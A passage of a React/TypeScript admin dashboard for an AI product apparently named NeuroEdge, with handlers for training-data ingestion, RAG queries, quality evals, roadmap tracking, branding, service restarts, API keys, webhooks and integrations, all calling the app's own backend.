    if (!id) return;
    setCreatorJobId(id);
    let attempts = 0;
    const maxAttempts = 120;
    while (attempts < maxAttempts) {
      attempts += 1;
      try {
        const data = await getJson(`/creator/job-status/${encodeURIComponent(id)}`);
        const job = data?.job || null;
        if (job) {
          setCreatorJob(job);
          if (job.status === "completed" || job.status === "failed") {
            setCreatorBusy(false);
            await loadCreatorHistory();
            return;
          }
        }
      } catch {
        // keep polling
      }
      await new Promise((r) => setTimeout(r, 1000));
    }
    setCreatorBusy(false);
  };

  const submitCreatorJob = async (path: string, payload: Record<string, any>) => {
    try {
      setCreatorBusy(true);
      const data = await postJson(path, payload);
      const id = String(data?.job_id || "");
      if (!id) {
        setCreatorBusy(false);
        addNotification({ type: "error", message: "Creator job did not return job ID" });
        return;
      }
      addNotification({ type: "success", message: `Creator job queued: ${id}` });
      await pollCreatorJob(id);
    } catch (err: any) {
      setCreatorBusy(false);
      addNotification({ type: "error", message: err?.message || "Creator job failed" });
    }
  };

  const parseTags = () =>
    trainingTagsCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);

  const ingestTrainingText = async () => {
    const text = trainingText.trim();
    if (!text) {
      addNotification({ type: "warn", message: "Enter training text first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/text", {
      title: trainingTitle.trim() || "manual_training",
      text,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Training text ingested (${data.chars || 0} chars).` });
    }
  };

  const ingestTrainingUrls = async () => {
    const urls = trainingUrls
      .split(/\n+/)
      .map((u) => u.trim())
      .filter(Boolean);
    if (urls.length === 0) {
      addNotification({ type: "warn", message: "Paste one or more URLs first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/urls", {
      urls,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `URL ingest complete. Accepted ${data.ingested || 0}.` });
      setBackendOutput(data);
    }
  };

  const ingestTrainingResearch = async () => {
    const query = trainingResearchQuery.trim();
    if (!query) {
      addNotification({ type: "warn", message: "Enter a research query first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/research", {
      query,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Research ingest completed." });
      setBackendOutput(data);
    }
  };

  const readFileAsBase64 = async (file: File) => {
    const buf = await file.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let binary = "";
    const chunk = 0x8000;
    for (let i = 0; i < bytes.length; i += chunk) {
      binary += String.fromCharCode(...bytes.subarray(i, i + chunk));
    }
    return btoa(binary);
  };

  const prepareTrainingFiles = async (files: FileList | null) => {
    if (!files || files.length === 0) return;
    const maxFiles = 200;
    const maxTextBytes = 2 * 1024 * 1024;
    const maxBinaryBytes = 4 * 1024 * 1024;
    const next: Array<{ name: string; type: string; textContent?: string; base64?: string }> = [];
    for (const f of Array.from(files).slice(0, maxFiles)) {
      const name = (f as any).webkitRelativePath || f.name;
      const lower = name.toLowerCase();
      const isText =
        f.type.startsWith("text/") ||
        /\.(md|txt|json|csv|ts|tsx|js|jsx|py|go|java|rs|sql|yaml|yml|html|css)$/i.test(lower);
      try {
        if (isText && f.size <= maxTextBytes) {
          const textContent = (await f.text()).slice(0, 200000);
          next.push({ name, type: f.type || "text/plain", textContent });
        } else if ((/\.zip$/i.test(lower) || /\.pdf$/i.test(lower) || !isText) && f.size <= maxBinaryBytes) {
          const base64 = await readFileAsBase64(f);
          next.push({ name, type: f.type || "application/octet-stream", base64 });
        }
      } catch {
        // skip unreadable file
      }
    }
    setTrainingUploadFiles((prev) => [...prev, ...next]);
    addNotification({ type: "success", message: `Prepared ${next.length} training file(s).` });
  };

  const ingestTrainingFiles = async () => {
    if (trainingUploadFiles.length === 0) {
      addNotification({ type: "warn", message: "Add files/folders/zip/pdf first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/files", {
      files: trainingUploadFiles,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `File ingest complete. Accepted ${data.ingested || 0}.` });
      setBackendOutput(data);
    }
  };

  const loadTrainingOverview = async () => {
    try {
      const data = await getJson("/admin/training/overview?limit=2000");
      setTrainingOverview(data);
      addNotification({ type: "info", message: "Training overview refreshed." });
    } catch (err: any) {
      addNotification({ type: "error", message: err?.message || "Failed to load training overview." });
    }
  };

  const queueTrainingJob = async () => {
    const data = await callAction("/admin/training/jobs/run", {
      mode: trainingJobMode,
      evalSuite: trainingEvalSuite,
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Training job queued (${data?.job?.id || "unknown"}).` });
      setBackendOutput(data);
    }
  };

  const ragBootstrapFromTraining = async () => {
    const data = await callAction("/admin/training/rag/bootstrap", {
      limit: 3000,
      domain: ragDomain,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `RAG bootstrapped from training samples (${data.sentDocs || 0} docs).` });
      setBackendOutput(data);
    }
  };

  const ragIngestQuick = async () => {
    const docs: Array<Record<string, any>> = [];
    if (trainingText.trim()) {
      docs.push({
        title: trainingTitle.trim() || "manual_rag_note",
        text: trainingText.trim(),
        domain: ragDomain,
        tags: parseTags(),
        source: "dashboard_training_studio",
      });
    }
    const urls = trainingUrls
      .split(/\n+/)
      .map((u) => u.trim())
      .filter(Boolean);
    if (docs.length === 0 && urls.length === 0) {
      addNotification({ type: "warn", message: "Add training text or URLs first for RAG ingest." });
      return;
    }
    const data = await callAction("/rag/ingest", {
      docs,
      urls,
      domain: ragDomain,
      tags: parseTags(),
      source: "dashboard",
      rebuild_index: true,
    });
    if (data?.ok) {
      addNotification({ type: "success", message: `RAG ingest complete (${data.created_chunks || 0} chunks).` });
      setBackendOutput(data);
    }
  };

  const ragAsk = async () => {
    const q = ragQuery.trim() || trainingResearchQuery.trim();
    if (!q) {
      addNotification({ type: "warn", message: "Enter a RAG question first." });
      return;
    }
    const data = await callAction("/rag/answer", {
      question: q,
      domain: ragDomain,
      top_k: 6,
      mode: "balanced",
      require_citations: true,
    });
    if (data?.ok) {
      addNotification({ type: "success", message: `RAG answer ready (${data.evidence_count || 0} evidence chunks).` });
      setBackendOutput(data);
    }
  };

  const runTrustedBootstrapPack = async () => {
    if (ragDomain === "general") {
      addNotification({ type: "warn", message: "Select medicine, agriculture, or market domain for trusted bootstrap pack." });
      return;
    }
    const data = await callAction("/admin/training/bootstrap-pack/run", {
      domain: ragDomain,
      includeSecondary: bootstrapIncludeSecondary,
      limit: bootstrapIncludeSecondary ? 18 : 10,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Trusted seed pack ingested for ${ragDomain}.` });
      setBackendOutput(data);
    }
  };

  const runNightlyRefreshNow = async () => {
    const data = await callAction("/admin/training/bootstrap-pack/auto-refresh/run", {
      domain: ragDomain === "general" ? "" : ragDomain,
      includeSecondary: bootstrapIncludeSecondary,
      limit: bootstrapIncludeSecondary ? 18 : 12,
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Nightly auto-refresh run executed." });
      setBackendOutput(data);
    }
  };

  const loadAutoRefreshStatus = async () => {
    const data = await callAction("GET:/admin/training/bootstrap-pack/auto-refresh/status", {});
    if (data?.success && data?.config) {
      setAutoRefreshEnabled(Boolean(data.config.enabled));
      setAutoRefreshHourUtc(String(data.config.hourUtc ?? "2"));
      setAutoRefreshMinuteUtc(String(data.config.minuteUtc ?? "10"));
      setAutoRefreshStaleHours(String(data.config.staleHours ?? "36"));
      setBackendOutput(data);
    }
  };

  const saveAutoRefreshConfig = async () => {
    const hourUtc = Math.max(0, Math.min(23, Number(autoRefreshHourUtc || 2)));
    const minuteUtc = Math.max(0, Math.min(59, Number(autoRefreshMinuteUtc || 10)));
    const staleHours = Math.max(12, Number(autoRefreshStaleHours || 36));
    const data = await callAction("/admin/training/bootstrap-pack/auto-refresh/config", {
      enabled: autoRefreshEnabled,
      hourUtc,
      minuteUtc,
      staleHours,
    });
    if (data?.success) {
      setAutoRefreshHourUtc(String(hourUtc));
      setAutoRefreshMinuteUtc(String(minuteUtc));
      setAutoRefreshStaleHours(String(staleHours));
      addNotification({ type: "success", message: "Auto-refresh config saved." });
      setBackendOutput(data);
    }
  };

  const refreshQualityInsights = async () => {
    if (!canAccessAdminOps) return;
    try {
      const [coverage, reliability, retrieval, trust, modelSummary] = await Promise.all([
        getJson("/admin/evals/coverage"),
        getJson("/admin/reliability/overview?windowHours=24"),
        getJson("/admin/retrieval/freshness?windowHours=72"),
        getJson("/admin/trust/signals?windowHours=72"),
        getJson("/admin/model-quality/summary"),
      ]);
      setQualityEvalCoverage(coverage?.coverage || null);
      setQualityReliability(reliability?.snapshot || null);
      setQualityRetrieval(retrieval?.summary || null);
      setQualityTrust(trust?.summary || null);
      setQualityModelSummary({
        router: modelSummary?.router || {},
        outcomes: modelSummary?.outcomes || {},
      });
      if (Array.isArray(modelSummary?.router?.variants)) {
        setModelRouterDraft(JSON.stringify(modelSummary.router.variants, null, 2));
      }
      try {
        const baselineData = await getJson("/admin/quality/benchmark/baselines");
        if (Array.isArray(baselineData?.baselines)) {
          setBenchmarkBaselinesDraft(JSON.stringify(baselineData.baselines, null, 2));
        }
      } catch {
        // ignore
      }
    } catch {
      // keep prior values; errors are shown when explicit action buttons are pressed
    }
  };

  const runQualityBatch = async () => {
    const data = await callAction("/admin/evals/run-batch", {
      suites: ["core", "reasoning", "coding", "research"],
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Quality eval batch completed." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const runQualityRedTeam = async () => {
    const data = await callAction("/admin/redteam/run", {});
    if (data?.success) {
      addNotification({ type: "success", message: "Red-team suite completed." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const runQualityHardening = async () => {
    const data = await callAction("/admin/quality/hardening/run", {});
    if (data?.success) {
      addNotification({ type: "success", message: "Quality hardening run completed." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const saveModelRouterFromDashboard = async () => {
    let variants: any[] = [];
    try {
      variants = JSON.parse(modelRouterDraft || "[]");
    } catch {
      addNotification({ type: "error", message: "Invalid model router JSON." });
      return;
    }
    if (!Array.isArray(variants) || variants.length === 0) {
      addNotification({ type: "error", message: "Add at least one model variant." });
      return;
    }
    const data = await callAction("/admin/model-quality/router", { variants });
    if (data?.success) {
      addNotification({ type: "success", message: "Model router saved." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const saveBenchmarkBaselinesFromDashboard = async () => {
    let baselines: any[] = [];
    try {
      baselines = JSON.parse(benchmarkBaselinesDraft || "[]");
    } catch {
      addNotification({ type: "error", message: "Invalid benchmark baselines JSON." });
      return;
    }
    if (!Array.isArray(baselines) || baselines.length === 0) {
      addNotification({ type: "error", message: "Add at least one benchmark baseline." });
      return;
    }
    const data = await callAction("/admin/quality/benchmark/baselines", { baselines });
    if (data?.success) {
      addNotification({ type: "success", message: "Benchmark baselines saved." });
      setBackendOutput(data);
    }
  };

  const refreshFrontierProgram = async () => {
    if (!canAccessAdminOps) return;
    const [programData, readinessData] = await Promise.all([
      callAction("GET:/admin/frontier-program", {}),
      callAction("GET:/admin/frontier-program/readiness", {}),
    ]);
    if (programData?.program) setBackendOutput(programData);
    if (readinessData?.readiness) setBackendOutput(readinessData);
  };

  const upsertFrontierItemFromDashboard = async () => {
    const id = frontierItemId.trim();
    if (!id) {
      addNotification({ type: "warn", message: "Enter an item ID (example: model_core_01)." });
      return;
    }
    const data = await callAction("/admin/frontier-program/item", {
      id,
      owner: frontierItemOwner.trim() || "founder",
      status: frontierItemStatus,
      priority: frontierItemPriority,
      notes: frontierItemNotes,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Frontier item updated: ${id}` });
      await refreshFrontierProgram();
    }
  };

  const bulkUpdateFrontierItemsFromDashboard = async () => {
    const ids = frontierBulkIds
      .split(/[\n,\s]+/)
      .map((s) => s.trim())
      .filter(Boolean);
    if (ids.length === 0) {
      addNotification({ type: "warn", message: "Enter one or more item IDs for bulk update." });
      return;
    }
    const data = await callAction("/admin/frontier-program/items/bulk", {
      ids,
      status: frontierBulkStatus,
      owner: frontierItemOwner.trim() || undefined,
      priority: frontierItemPriority,
      notes: frontierItemNotes,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Bulk updated ${ids.length} frontier items.` });
      await refreshFrontierProgram();
    }
  };

  const upsertFrontierMilestoneFromDashboard = async () => {
    const id = frontierMilestoneId.trim();
    if (!id) {
      addNotification({ type: "warn", message: "Enter a milestone ID." });
      return;
    }
    const criteria = frontierMilestoneCriteria
      .split(/\n+/)
      .map((s) => s.trim())
      .filter(Boolean);
    const data = await callAction("/admin/frontier-program/milestone", {
      id,
      name: frontierMilestoneName.trim() || id,
      quarter: frontierMilestoneQuarter.trim() || "Q4-2026",
      owner: frontierMilestoneOwner.trim() || "founder",
      status: frontierMilestoneStatus,
      successCriteria: criteria,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Milestone updated: ${id}` });
      await refreshFrontierProgram();
    }
  };

  const resetFrontierProgramFromDashboard = async () => {
    if (!isFounderUser()) {
      addNotification({ type: "error", message: "Only founder can reset frontier program." });
      return;
    }
    const data = await callAction("/admin/frontier-program/reset", {});
    if (data?.success) {
      addNotification({ type: "success", message: "Frontier program reset to default roadmap." });
      await refreshFrontierProgram();
    }
  };

  const autoRefreshLocalLabel = useMemo(() => {
    const hourUtc = Math.max(0, Math.min(23, Number(autoRefreshHourUtc || 0)));
    const minuteUtc = Math.max(0, Math.min(59, Number(autoRefreshMinuteUtc || 0)));
    const utcDate = new Date(Date.UTC(2026, 0, 1, hourUtc, minuteUtc, 0, 0));
    const local = utcDate.toLocaleString(undefined, {
      weekday: "short",
      hour: "2-digit",
      minute: "2-digit",
      timeZoneName: "short",
    });
    const hh = String(hourUtc).padStart(2, "0");
    const mm = String(minuteUtc).padStart(2, "0");
    return `UTC ${hh}:${mm} → Local ${local}`;
  }, [autoRefreshHourUtc, autoRefreshMinuteUtc]);

  const trainingStudioCard = (
    <Card title="NeuroEdge Training Studio (Founder/Admin)">
      <div style={{ display: "grid", gap: 8 }}>
        <input value={trainingTitle} onChange={(e) => setTrainingTitle(e.target.value)} placeholder="Dataset title" style={input} />
        <textarea value={trainingText} onChange={(e) => setTrainingText(e.target.value)} placeholder="Paste raw training text, policy docs, instructions..." style={{ ...input, minHeight: 90 }} />
        <input value={trainingTagsCsv} onChange={(e) => setTrainingTagsCsv(e.target.value)} placeholder="Tags (comma-separated)" style={input} />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={ ingestTrainingText }>Ingest Text</button>
          <button style={chip} onClick={() => { setTrainingTitle("Founder Training Note"); setTrainingText(""); }}>Clear Text</button>
        </div>

        <textarea value={trainingUrls} onChange={(e) => setTrainingUrls(e.target.value)} placeholder={"URL list (one per line)\nhttps://example.com/a\nhttps://example.com/b"} style={{ ...input, minHeight: 90 }} />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} onClick={ingestTrainingUrls}>Ingest URLs (crawl text)</button>
          <input value={trainingResearchQuery} onChange={(e) => setTrainingResearchQuery(e.target.value)} placeholder="Research query for dataset generation" style={{ ...input, minWidth: 220 }} />
          <button style={chip} onClick={ingestTrainingResearch}>Ingest Research Query</button>
        </div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <label style={chip}>
            Upload Files
            <input type="file" multiple style={{ display: "none" }} onChange={(e) => prepareTrainingFiles(e.target.files)} />
          </label>
          <label style={chip}>
            Upload Folder
            <input type="file" multiple webkitdirectory="" style={{ display: "none" }} onChange={(e) => prepareTrainingFiles(e.target.files)} />
          </label>
          <label style={chip}>
            Upload Zip/PDF
            <input type="file" multiple accept=".zip,.pdf" style={{ display: "none" }} onChange={(e) => prepareTrainingFiles(e.target.files)} />
          </label>
          <button style={primary} onClick={ingestTrainingFiles}>Ingest Prepared Files</button>
          <button style={chip} onClick={() => setTrainingUploadFiles([])}>Clear Prepared</button>
        </div>
        <div style={muted}>Prepared files: {trainingUploadFiles.length}. Supports files, folders, zip, pdf, and mixed datasets.</div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, dedupe: !p.dedupe }))}>Dedupe: {trainingOptions.dedupe ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, piiFilter: !p.piiFilter }))}>PII Filter: {trainingOptions.piiFilter ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, autoTag: !p.autoTag }))}>Auto-tag: {trainingOptions.autoTag ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, semanticChunking: !p.semanticChunking }))}>Chunking: {trainingOptions.semanticChunking ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, crawlLinks: !p.crawlLinks }))}>Crawl Links: {trainingOptions.crawlLinks ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, citationMode: !p.citationMode }))}>Citation Mode: {trainingOptions.citationMode ? "on" : "off"}</button>
        </div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
          <select value={ragDomain} onChange={(e) => setRagDomain(e.target.value as any)} style={input}>
            <option value="general">RAG domain: general</option>
            <option value="medicine">RAG domain: medicine</option>
            <option value="agriculture">RAG domain: agriculture</option>
            <option value="market">RAG domain: market</option>
          </select>
          <input value={ragQuery} onChange={(e) => setRagQuery(e.target.value)} placeholder="Ask indexed RAG knowledge..." style={{ ...input, minWidth: 260 }} />
          <button style={primary} onClick={ragIngestQuick}>Ingest to RAG</button>
          <button style={chip} onClick={ragBootstrapFromTraining}>Bootstrap RAG from Training</button>
          <button style={chip} onClick={runTrustedBootstrapPack}>Trusted Seed Pack (One-Click)</button>
          <button style={chip} onClick={() => setBootstrapIncludeSecondary((v) => !v)}>
            Secondary Sources: {bootstrapIncludeSecondary ? "on" : "off"}
          </button>
          <button style={chip} onClick={runNightlyRefreshNow}>Run Nightly Refresh Now</button>
          <button style={chip} onClick={() => callAction("GET:/admin/training/bootstrap-pack/auto-refresh/status").then((d) => setBackendOutput(d))}>
            Auto-Refresh Status
          </button>
          <button style={chip} onClick={ragAsk}>Ask RAG</button>
          <button style={chip} onClick={() => callAction("/rag/reindex", {}).then((d) => setBackendOutput(d))}>Reindex RAG</button>
          <button style={chip} onClick={() => callAction("GET:/admin/training/bootstrap-pack/list").then((d) => setBackendOutput(d))}>View Trusted Sources</button>
          <button style={chip} onClick={() => callAction("GET:/rag/stats").then((d) => setBackendOutput(d))}>RAG Stats</button>
        </div>

        <div style={{ border: "1px solid rgba(148,163,184,0.2)", borderRadius: 12, padding: 10, display: "grid", gap: 8 }}>
          <div style={{ fontWeight: 600 }}>Auto-Refresh Config</div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
            <button style={chip} onClick={() => setAutoRefreshEnabled((v) => !v)}>
              Enabled: {autoRefreshEnabled ? "on" : "off"}
            </button>
            <input
              value={autoRefreshHourUtc}
              onChange={(e) => setAutoRefreshHourUtc(e.target.value.replace(/[^\d]/g, ""))}
              placeholder="Hour UTC (0-23)"
              style={{ ...input, width: 140 }}
            />
            <input
              value={autoRefreshMinuteUtc}
              onChange={(e) => setAutoRefreshMinuteUtc(e.target.value.replace(/[^\d]/g, ""))}
              placeholder="Minute UTC (0-59)"
              style={{ ...input, width: 150 }}
            />
            <input
              value={autoRefreshStaleHours}
              onChange={(e) => setAutoRefreshStaleHours(e.target.value.replace(/[^\d]/g, ""))}
              placeholder="Stale hours (>=12)"
              style={{ ...input, width: 150 }}
            />
            <button style={primary} onClick={saveAutoRefreshConfig}>Save Config</button>
            <button style={chip} onClick={loadAutoRefreshStatus}>Load Status</button>
          </div>
          <div style={{ color: "rgba(148,163,184,0.95)", fontSize: 12 }}>
            Timezone helper: {autoRefreshLocalLabel}
          </div>
        </div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select value={trainingJobMode} onChange={(e) => setTrainingJobMode(e.target.value as any)} style={input}>
            <option value="incremental">incremental</option>
            <option value="full">full</option>
            <option value="eval_only">eval_only</option>
          </select>
          <select value={trainingEvalSuite} onChange={(e) => setTrainingEvalSuite(e.target.value as any)} style={input}>
            <option value="core">core</option>
            <option value="math">math</option>
            <option value="code">code</option>
            <option value="research">research</option>
            <option value="all">all</option>
          </select>
          <button style={primary} onClick={queueTrainingJob}>Queue Training Job</button>
          <button style={chip} onClick={loadTrainingOverview}>Refresh Overview</button>
          <button style={chip} onClick={() => window.open(`${apiBase}/training/export?limit=10000`, "_blank")}>Export JSONL</button>
        </div>
      </div>
      <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 260, overflow: "auto" }}>
        {trainingOverview ? JSON.stringify(trainingOverview, null, 2) : "No training overview yet."}
      </pre>
    </Card>
  );

  const readImageAsDataUrl = (file: File) =>
    new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result || ""));
      reader.onerror = () => reject(reader.error);
      reader.readAsDataURL(file);
    });

  const onBrandAssetUpload = async (
    kind: "logoUrl" | "iconUrl" | "faviconUrl" | "mainChatBackgroundUrl" | "floatingChatBackgroundUrl" | "loginBackgroundUrl",
    files: FileList | null
  ) => {
    const file = files?.[0];
    if (!file) return;
    if (!file.type.startsWith("image/")) {
      addNotification({ type: "error", message: "Please upload an image file." });
      return;
    }
    try {
      const dataUrl = await readImageAsDataUrl(file);
      setBrandingDraft((prev) => ({ ...prev, [kind]: dataUrl }));
      addNotification({ type: "success", message: `${kind.replace("Url", "")} selected.` });
    } catch {
      addNotification({ type: "error", message: "Failed to read image." });
    }
  };

  const saveBrandingSettings = () => {
    const next: BrandingConfig = {
      productName: brandingDraft.productName.trim() || defaultBranding.productName,
      logoUrl: brandingDraft.logoUrl || defaultBranding.logoUrl,
      iconUrl: brandingDraft.iconUrl || defaultBranding.iconUrl,
      faviconUrl: brandingDraft.faviconUrl || brandingDraft.iconUrl || defaultBranding.faviconUrl,
      mainChatBackgroundUrl: brandingDraft.mainChatBackgroundUrl || "",
      floatingChatBackgroundUrl: brandingDraft.floatingChatBackgroundUrl || "",
      loginBackgroundUrl: brandingDraft.loginBackgroundUrl || "",
      mainChatOverlayOpacity: Number(brandingDraft.mainChatOverlayOpacity || defaultBranding.mainChatOverlayOpacity),
      floatingOverlayOpacity: Number(brandingDraft.floatingOverlayOpacity || defaultBranding.floatingOverlayOpacity),
      loginOverlayOpacity: Number(brandingDraft.loginOverlayOpacity || defaultBranding.loginOverlayOpacity),
      accentColor: brandingDraft.accentColor || defaultBranding.accentColor,
      glassBlur: Number(brandingDraft.glassBlur || defaultBranding.glassBlur),
    };
    saveBranding(next);
    applyBrandingToDocument(next);
    addNotification({ type: "success", message: "Branding updated across app." });
  };

  const requestServiceRestart = async (service: "kernel" | "ml" | "orchestrator" | "frontend") => {
    if (!confirmSafeAction({ title: `${service} service`, actionLabel: "restart" })) return;
    const reason = window.prompt(`Reason for restarting ${service}:`, "Emergency maintenance");
    if (!reason || reason.trim().length < 8) {
      addNotification({ type: "error", message: "Restart reason is required (min 8 characters)." });
      return;
    }
    const urgencyInput = (window.prompt("Urgency: emergency | high | normal | low", "normal") || "normal").trim().toLowerCase();
    const urgency = ["emergency", "high", "normal", "low"].includes(urgencyInput) ? urgencyInput : "normal";
    try {
      const data = await postJson("/admin/restart", {
        service,
        confirm: true,
        reason: reason.trim(),
        urgency,
      });
      addNotification({
        type: "info",
        message: data?.scheduledAt
          ? `Restart queued for maintenance window (${new Date(data.scheduledAt).toLocaleString()}).`
          : (data?.message || `Restart requested for ${service}`),
      });
    } catch (err: any) {
      addNotification({ type: "error", message: `Restart request failed: ${err?.message || err}` });
    }
  };

  const addDevApiKey = async () => {
    const name = window.prompt("API key name:", "New API Key");
    if (!name) return;
    await callAction("/admin/dashboard/api-keys/create", { name: name.trim() });
    addNotification({ type: "success", message: "API key created." });
  };

  const addWebhook = async () => {
    if (!devWebhook.trim()) {
      addNotification({ type: "error", message: "Enter a webhook URL first." });
      return;
    }
    await callAction("/admin/dashboard/webhooks/upsert", {
      webhook: { url: devWebhook.trim(), event: webhookEvent, active: true },
    });
    addNotification({ type: "success", message: "Webhook added." });
  };

  const createIntegration = async () => {
    const appName = integrationDraft.appName.trim();
    if (!appName) {
      addNotification({ type: "error", message: "App name is required." });
      return;
    }
    const scopes = integrationDraft.scopesCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const allowedOrigins = integrationDraft.originsCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const body = {
      integration: {
        appName,
        appDescription: integrationDraft.appDescription.trim(),
        environment: integrationDraft.environment,
        scopes: scopes.length ? scopes : ["chat:write"],
        allowedOrigins,
        webhookUrl: integrationDraft.webhookUrl.trim(),
        rateLimitPerMin: Number(integrationDraft.rateLimitPerMin || 120),
      },
    };
    const data = await callAction("/admin/dashboard/integrations/upsert", body);
    if (data?.apiKey) {
      setLatestGeneratedApiKey(String(data.apiKey));
      addNotification({ type: "success", message: "Integration created. Copy API key now." });
    }
  };

  const requestPaidIntegrationKey = async () => {
    const appName = integrationDraft.appName.trim();
    if (!appName) {
      addNotification({ type: "error", message: "App name is required." });
      return;
    }
    const scopes = integrationDraft.scopesCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const allowedOrigins = integrationDraft.originsCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const data = await callAction("/dashboard/integrations/request-key", {
      appName,
      appDescription: integrationDraft.appDescription.trim(),
      environment: integrationDraft.environment,
      scopes: scopes.length ? scopes : ["chat:write"],
      allowedOrigins,
      webhookUrl: integrationDraft.webhookUrl.trim(),
      rateLimitPerMin: Number(integrationDraft.rateLimitPerMin || 60),
    });
    if (data?.apiKey) {
      setLatestGeneratedApiKey(String(data.apiKey));
      addNotification({ type: "success", message: "Paid key issued. Copy API key now." });
    }
  };

  const clearDomainLinkDraft = () => {
    setDomainLinkDraft({
      id: "",
      name: "",
      url: "",
      type: "public",
      environment: "production",
      audience: "users",
      status: "active",
      description: "",
      tagsCsv: "",
      owner: "",
      notes: "",
    });
  };

  const upsertDomainLink = async () => {
    const name = domainLinkDraft.name.trim();
    const url = domainLinkDraft.url.trim();
    if (!name || !url) {
      addNotification({ type: "error", message: "Enter link name and URL." });
      return;
    }
    const tags = domainLinkDraft.tagsCsv
      .split(",")
      .map((t) => t.trim())
      .filter(Boolean);
    const data = await callAction("/admin/dashboard/links/upsert", {
      link: {
        id: domainLinkDraft.id || undefined,
        name,
        url,
        type: domainLinkDraft.type,
        environment: domainLinkDraft.environment,
        audience: domainLinkDraft.audience,
        status: domainLinkDraft.status,
        description: domainLinkDraft.description.trim(),
        tags,
        owner: domainLinkDraft.owner.trim(),
        notes: domainLinkDraft.notes.trim(),
      },
    });
    if (data?.success) {
      clearDomainLinkDraft();
      addNotification({ type: "success", message: "Domain/link saved." });
    }
  };

  const editDomainLink = (link: DomainLink) => {
    setDomainLinkDraft({
      id: link.id,
      name: link.name,
      url: link.url,
      type: link.type,
      environment: link.environment,
      audience: link.audience,
      status: link.status,
      description: link.description || "",
      tagsCsv: Array.isArray(link.tags) ? link.tags.join(", ") : "",
      owner: link.owner || "",
      notes: link.notes || "",
    });
  };

  const toggleDomainLink = async (id: string) => {
    await callAction("/admin/dashboard/links/toggle", { id });
  };

  const verifyDomainLink = async (id: string) => {
    const data = await callAction("/admin/dashboard/links/verify", { id });
    if (!data) return;
    if (data.reachable) {
      addNotification({ type: "success", message: `Link verified (${data.status}).` });
    } else {
      addNotification({ type: "warn", message: `Link not reachable: ${data.error || data.status || "unknown"}` });
    }
  };

  const testWebhook = async (id: string) => {
    const hook = webhooks.find((w) => w.id === id);
    if (!hook) return;
    await callAction("/admin/dashboard/webhooks/test", { id });
    addNotification({ type: "info", message: `Webhook test sent to ${hook.url}` });
  };

  const addSupportTicket = async () => {
    const subject = newTicket.trim();
    if (!subject) return;
    await callAction("/admin/dashboard/tickets/upsert", {
      ticket: { subject, priority: "medium", status: "open", assignee: "unassigned" },
    });
    setNewTicket("");
    addNotification({ type: "success", message: "Support ticket created." });
  };

  const addAgentProfile = async () => {
    const name = window.prompt("Agent name:", "New Agent");
    if (!name) return;
    await callAction("/admin/dashboard/agents/upsert", {
      agent: {
        name: name.trim(),
        memoryDays: 30,
        tools: ["chat"],
        permission: "workspace",
      },
    });
  };

  const addSavedPrompt = async () => {
    if (!newPromptTitle.trim() || !newPromptText.trim()) {
      addNotification({ type: "error", message: "Add prompt title and text." });
      return;
    }
    await callAction("/admin/dashboard/prompts/upsert", {
      prompt: { title: newPromptTitle.trim(), text: newPromptText.trim() },
    });
    setNewPromptTitle("");
    setNewPromptText("");
    addNotification({ type: "success", message: "Prompt saved." });
  };

  const selectedAgent = agentsLocal.find((a) => a.id === selectedAgentId) || null;

  const updateAgent = async (id: string, patch: Partial<AgentProfile>) => {
    const current = agentsLocal.find((a) => a.id === id);
    if (!current) return;
    await callAction("/admin/dashboard/agents/upsert", { agent: { ...current, ...patch, id } });
  };

  const toggleAgentTool = async (id: string, tool: string) => {
    const current = agentsLocal.find((a) => a.id === id);
    if (!current) return;
    const has = current.tools.includes(tool);
    const tools = has ? current.tools.filter((t) => t !== tool) : [...current.tools, tool];
    await callAction("/admin/dashboard/agents/upsert", { agent: { ...current, tools, id } });
  };

  const addDepartment = async () => {
    const name = newDepartmentName.trim();
    const members = Number(newDepartmentMembers);
